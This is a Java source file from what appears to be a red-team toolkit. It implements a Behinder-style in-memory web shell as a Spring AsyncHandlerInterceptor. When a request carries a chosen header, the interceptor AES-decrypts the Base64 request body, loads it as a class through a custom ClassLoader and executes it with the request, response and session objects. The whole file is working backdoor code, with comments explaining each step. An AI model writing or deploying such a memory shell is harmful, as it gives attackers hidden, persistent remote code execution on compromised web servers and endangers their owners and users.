package com.potato.potatotool.content.redTeam.memshell.memoryShell.behinder;

import org.springframework.web.servlet.AsyncHandlerInterceptor;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.util.Map;

public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInterceptor {


    public String pass;

    public String headerName;

    public String headerValue;

    // 使用ClassLoader的defineClass方法将字节数组定义为一个类。
    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }


    public BehinderInterceptor(ClassLoader c) {
        super(c);
    }


    public BehinderInterceptor() {
    }

    // 功能：在请求处理之前执行的拦截器逻辑。
    //逻辑：
    //检查HTTP请求头是否包含特定值，如果包含则执行特定逻辑：
    //获取当前会话并存储请求和响应对象。
    //使用AES解密请求体中的数据，并将解密后的字节码定义为一个类并实例化。
    //如果请求头不包含特定值，则返回true继续处理请求，否则返回false中断请求处理。
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
            try {
                HttpSession session = request.getSession();
                Map obj = new HashMap();
                obj.put("request", request);
                obj.put("response", response);
                obj.put("session", session);
                session.putValue("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                (new BehinderInterceptor(this.getClass().getClassLoader())).g(c.doFinal(this.b64Decode(request.getReader().readLine()))).newInstance().equals(obj);
            } catch (Exception e) {
            }
            return false;
        } else {
            return true;
        }
    }

    public static byte[] b64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}

